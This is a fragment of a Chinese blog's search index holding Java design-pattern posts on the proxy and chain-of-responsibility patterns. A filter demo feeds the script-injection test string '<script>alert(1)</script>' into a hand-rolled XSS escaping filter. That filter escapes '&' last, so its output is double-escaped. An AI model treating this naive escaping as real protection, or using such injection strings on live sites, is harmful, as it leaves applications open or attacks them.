class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">ITarget</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 目标类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Target</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ITarget</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;天气真好&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 代理类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Proxy</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">InvocationHandler</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Object target;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 绑定创建代理对象</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> target</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">bind</span><span class=\"params\">(Object target)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.target = target;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> java.lang.reflect.Proxy.newProxyInstance(</span><br><span class=\"line\">                target.getClass().getClassLoader(),</span><br><span class=\"line\">                target.getClass().getInterfaces(),</span><br><span class=\"line\">                <span class=\"built_in\">this</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;记录日志：开始调用目标方法Target.operation&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">invoke</span> <span class=\"operator\">=</span> method.invoke(target, args);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;记录日志：目标方法Target.operation调用结束。耗时：&quot;</span> + (System.currentTimeMillis() - start));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> invoke;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ITarget</span> <span class=\"variable\">target</span> <span class=\"operator\">=</span> (ITarget) <span class=\"keyword\">new</span> <span class=\"title class_\">Proxy</span>().bind(<span class=\"keyword\">new</span> <span class=\"title class_\">Target</span>());</span><br><span class=\"line\">        target.operation();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"JDK中代理模式使用\"><a href=\"#JDK中代理模式使用\" class=\"headerlink\" title=\"JDK中代理模式使用\"></a>JDK中代理模式使用</h3><p>java.lang.reflect.Proxy：生成代理对象<br>RMI：代理远程调用</p>\n<h3 id=\"代理模式总结\"><a href=\"#代理模式总结\" class=\"headerlink\" title=\"代理模式总结\"></a>代理模式总结</h3><p>适配器模式、装饰模式、代理模式三者之间看起来非常相似，之前在装饰模式中总结过适配器模式和装饰模式之前区别。对于装饰模式和代理模式区别在与：</p>\n<ul>\n<li>1.对于静态代理，代理类是在编译的时候就确定了代理对象，而适配器是在调用的时候确定的被装饰对象。因为在使用装饰器的时候，通常是传递一个被装饰对象到装饰器中，而且装饰模式可以嵌套装饰。</li>\n<li>2.对于动态代理，代理类虽然和装饰模式一样需要传递一个对象，但是代理类并不需要实现与目标类相同的接口。<br>动态代理UML类图：<br><img src=\"/images/old/20171018%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-18%E4%B8%8A%E5%8D%8811.39.05.png\"></li>\n</ul>\n<p><strong>使用场景：</strong></p>\n<ul>\n<li>当客户端对象需要访问远程主机中的对象时可以使用远程代理。</li>\n<li>当需要控制对一个对象的访问。</li>\n<li>当需要为一个对象的访问（引用）提供一些额外的操作</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>能够协调调用者和被调用者，在一定程度上降低了系统的耦合度。</li>\n<li>客户端可以针对抽象主题角色进行编程，增加和更换代理类无须修改源代码，符合开闭原则，系统具有较好的灵活性和可扩展性。</li>\n<li>远程代理为位于两个不同地址空间对象的访问提供了一种实现机制，可以将一些消耗资源较多的对象和操作移至性能更好的计算机上，提高系统的整体运行效率。</li>\n<li>还有其他不同代理类型优点不同</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢，例如保护代理。</li>\n<li>实现代理模式需要额外的工作，而且有些代理模式的实现过程较为复杂，例如远程代理。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","代理模式","Proxy-Pattern"]},{"title":"Java设计模式-职责链模式（Chain of Responsibility Pattern）","url":"/2017/10/20/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%81%8C%E8%B4%A3%E9%93%BE%E6%A8%A1%E5%BC%8F%EF%BC%88Chain-of-Responsibility-Pattern%EF%BC%89/","content":"<h3 id=\"职责链模式（责任链模式）\"><a href=\"#职责链模式（责任链模式）\" class=\"headerlink\" title=\"职责链模式（责任链模式）\"></a>职责链模式（责任链模式）</h3><blockquote>\n<p>避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。职责链模式是一种对象行为型模式。</p>\n</blockquote>\n<p>职责链模式结构的核心在于引入了一个抽象处理者。UML类图如下：<br><img src=\"/images/old/20171020%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-20%E4%B8%8A%E5%8D%8810.53.12.png\"><span id=\"more\"></span></p>\n<ul>\n<li>Handler（抽象处理者）：它定义了一个处理请求的接口，一般设计为抽象类，由于不同的具体处理者处理请求的方式不同，因此在其中定义了抽象请求处理方法。因为每一个处理者的下家还是一个处理者，因此在抽象处理者中定义了一个抽象处理者类型的对象（如结构图中的successor），作为其对下家的引用。通过该引用，处理者可以连成一条链。</li>\n<li>ConcreteHandler（具体处理者）：它是抽象处理者的子类，可以处理用户请求，在具体处理者类中实现了抽象处理者中定义的抽象请求处理方法，在处理请求之前需要进行判断，看是否有相应的处理权限，如果可以处理请求就处理它，否则将请求转发给后继者；在具体处理者中可以访问链中下一个对象，以便请求的转发。</li>\n</ul>\n<p>在职责链模式里，很多对象由每一个对象对其下家的引用而连接起来形成一条链。请求在这个链上传递，直到链上的某一个对象决定处理此请求。发出这个请求的客户端并不知道链上的哪一个对象最终处理这个请求，这使得系统可以在不影响客户端的情况下动态地重新组织链和分配责任。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Handler</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Handler successor;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setSuccessor</span><span class=\"params\">(Handler successor)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.successor = successor;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleRequest</span><span class=\"params\">(String request)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteHandlerA</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Handler</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">handleRequest</span><span class=\"params\">(String request)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"string\">&quot;满足A&quot;</span>.equals(request))&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;A处理&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            successor.handleRequest(request);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteHandlerB</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Handler</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">handleRequest</span><span class=\"params\">(String request)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&quot;满足B&quot;</span>.equals(request))&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;B处理&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            successor.handleRequest(request);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此处属于最简单的职责链，实际使用过程中，可能并没有怎么简单。</p>\n<p>在使用职责链的时候分为纯职责链、不纯的职责链模式</p>\n<ul>\n<li>纯职责链：一个纯的职责链模式要求一个具体处理者对象只能在两个行为中选择一个：要么承担全部责任，要么将责任推给下家，不允许出现某一个具体处理者对象在承担了一部分或全部责任后又将责任向下传递的情况。而且在纯的职责链模式中，要求一个请求必须被某一个处理者对象所接收，不能出现某个请求未被任何一个处理者对象处理的情况。</li>\n<li>不纯的职责链：在一个不纯的职责链模式中允许某个请求被一个具体处理者部分处理后再向下传递，或者一个具体处理者处理完某请求后其后继处理者可以继续处理该请求，而且一个请求可以最终不被任何处理者对象所接收。</li>\n</ul>\n<h3 id=\"在java-web中应用\"><a href=\"#在java-web中应用\" class=\"headerlink\" title=\"在java web中应用\"></a>在java web中应用</h3><p>在java web中filter就使用了职责链模式。<br>这里模仿filter实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 这里request、response、filterChain原本是使用的接口，这里使用的是类，为了简化模型</span></span><br><span class=\"line\"><span class=\"comment\"> * request请求</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Request</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String header;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String body;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Request</span><span class=\"params\">(String header, String body)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.header = header;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.body = body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getHeader</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> header;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setHeader</span><span class=\"params\">(String header)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.header = header;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getBody</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setBody</span><span class=\"params\">(String body)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.body = body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * response请求</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Response</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String header;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String body;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Response</span><span class=\"params\">(String header, String body)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.header = header;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.body = body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getHeader</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> header;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setHeader</span><span class=\"params\">(String header)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.header = header;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getBody</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setBody</span><span class=\"params\">(String body)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.body = body;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 拦截器</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Filter</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//指定拦截url</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> String urlPattern;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Filter</span><span class=\"params\">(String urlPattern)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.urlPattern = urlPattern;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 拦截</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> request</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> response</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> filterChain</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doFilter</span><span class=\"params\">(Request request, Response response, FilterChain filterChain)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"type\">boolean</span> <span class=\"title function_\">valid</span><span class=\"params\">(String str)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> str.startsWith(urlPattern);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 避免Xss攻击，消息转义</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">XSSFilter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Filter</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">XSSFilter</span><span class=\"params\">(String urlPattern)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(urlPattern);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doFilter</span><span class=\"params\">(Request request, Response response, FilterChain filterChain)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;消息转义拦截器处理！！！&quot;</span>);</span><br><span class=\"line\">        request.setBody(request.getBody()</span><br><span class=\"line\">                .replaceAll(<span class=\"string\">&quot;&lt;&quot;</span>, <span class=\"string\">&quot;&amp;lt;&quot;</span>)</span><br><span class=\"line\">                .replaceAll(<span class=\"string\">&quot;&gt;&quot;</span>, <span class=\"string\">&quot;&amp;gt;&quot;</span>)</span><br><span class=\"line\">                .replaceAll(<span class=\"string\">&quot;&amp;&quot;</span>, <span class=\"string\">&quot;&amp;amp;&quot;</span>));</span><br><span class=\"line\">        filterChain.doFilter(request, response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 登陆拦截器</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LoginFilter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Filter</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">LoginFilter</span><span class=\"params\">(String urlPattern)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(urlPattern);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doFilter</span><span class=\"params\">(Request request, Response response, FilterChain filterChain)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;登陆拦截器处理！！！&quot;</span>);</span><br><span class=\"line\">        filterChain.doFilter(request, response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * API接口拦截器</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ApiFilter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Filter</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ApiFilter</span><span class=\"params\">(String urlPattern)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(urlPattern);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doFilter</span><span class=\"params\">(Request request, Response response, FilterChain filterChain)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;API接口拦截器处理！！！&quot;</span>);</span><br><span class=\"line\">        filterChain.doFilter(request, response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 过滤器链</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FilterChain</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//所有过滤器</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;Filter&gt; filters = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Iterator&lt;Filter&gt; filterIterator = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">addFilter</span><span class=\"params\">(Filter filter)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> filters.add(filter);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//过滤器开始执行</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doFilter</span><span class=\"params\">(Request request, Response response)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (filterIterator == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            filterIterator = filters.iterator();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (filterIterator.hasNext()) &#123;</span><br><span class=\"line\">            filterIterator.next().doFilter(request, response, <span class=\"built_in\">this</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//配置拦截器</span></span><br><span class=\"line\">        <span class=\"type\">XSSFilter</span> <span class=\"variable\">xssFilter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">XSSFilter</span>(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">LoginFilter</span> <span class=\"variable\">loginFilter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">LoginFilter</span>(<span class=\"string\">&quot;/user/&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ApiFilter</span> <span class=\"variable\">apiFilter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ApiFilter</span>(<span class=\"string\">&quot;/api&quot;</span>);</span><br><span class=\"line\">        List&lt;Filter&gt; filters = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        filters.add(xssFilter);</span><br><span class=\"line\">        filters.add(loginFilter);</span><br><span class=\"line\">        filters.add(apiFilter);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">url</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;/user/xxxx&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>(url, <span class=\"string\">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//通过URL生产拦截器链</span></span><br><span class=\"line\">        <span class=\"type\">FilterChain</span> <span class=\"variable\">filterChain</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FilterChain</span>();</span><br><span class=\"line\">        filters.forEach(filter -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (filter.valid(request.getHeader()))&#123;</span><br><span class=\"line\">                filterChain.addFilter(filter);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        filterChain.doFilter(request, <span class=\"literal\">null</span>);</span><br><span class=\"line\">        System.out.println(request.getBody());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>UML类图：<br><img src=\"/images/old/20171020%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-20%E4%B8%8B%E5%8D%881.56.52.png\"><br>代码中通过请求URL来获取需要的拦截器组成拦截器链，在实际web中url-pattern配置FilterConfig。</p>\n<p>在spring中FilterChain实现有多种，有维护List（集合）、维护nextFilterChain（链表）。</p>\n<h3 id=\"拦截器总结\"><a href=\"#拦截器总结\" class=\"headerlink\" title=\"拦截器总结\"></a>拦截器总结</h3><p>在平常项目中，大量使用了else if，每个else if中有大量逻辑等，可以改造成职责链模式。<br>如：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//当前可以参加的所有套装活动</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"string\">&quot;单品多件&quot;</span>.equals(type))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//单品多件筛选逻辑</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">&quot;固定搭配&quot;</span>.equals(type))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//固定搭配筛选逻辑</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">&quot;自由组合&quot;</span>.equals(type))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//自由组合筛选逻辑</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样每次通过添加else if判断处理相关内容，业务变更，后续代码添加，导致代码特别长，无法灵活使用。</p>\n<p>职责链模式通过建立一条链来组织请求的处理者，请求将沿着链进行传递，请求发送者无须知道请求在何时、何处以及如何被处理，实现了请求发送者与处理者的解耦。</p>\n<p><strong>应用场景：</strong></p>\n<ul>\n<li>有多个对象可以处理同一个请求，具体哪个对象处理该请求待运行时刻再确定，客户端只需将请求提交到链上，而无须关心请求的处理对象是谁以及它是如何处理的。</li>\n<li>在不明确指定接收者的情况下，向多个对象中的一个提交一个请求。</li>\n<li>可动态指定一组对象处理请求，客户端可以动态创建职责链来处理请求，还可以改变链中处理者之间的先后次序。</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>职责链模式使得一个对象无须知道是其他哪一个对象处理其请求，对象仅需知道该请求会被处理即可，接收者和发送者都没有对方的明确信息，且链中的对象不需要知道链的结构，由客户端负责链的创建，降低了系统的耦合度。</li>\n<li>请求处理对象仅需维持一个指向其后继者的引用，而不需要维持它对所有的候选处理者的引用，可简化对象的相互连接。</li>\n<li>在给对象分派职责时，职责链可以给我们更多的灵活性，可以通过在运行时对该链进行动态的增加或修改来增加或改变处理一个请求的职责。</li>\n<li>在系统中增加一个新的具体请求处理者时无须修改原有系统的代码，只需要在客户端重新建链即可，从这一点来看是符合“开闭原则”的。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>由于一个请求没有明确的接收者，那么就不能保证它一定会被处理，该请求可能一直到链的末端都得不到处理；一个请求也可能因职责链没有被正确配置而得不到处理。</li>\n<li>对于比较长的职责链，请求的处理可能涉及到多个处理对象，系统性能将受到一定影响，而且在进行代码调试时不太方便。</li>\n<li>如果建链不当，可能会造成循环调用，将导致系统陷入死循环。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","职责链模式","职责链模式（Chain of Responsibility Pattern）"]},{"title":"Java设计模式-命令模式（Command Pattern）","url":"/2017/10/26/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%EF%BC%88Command-Pattern%EF%BC%89/","content":"<h3 id=\"命令模式\"><a href=\"#命令模式\" class=\"headerlink\" 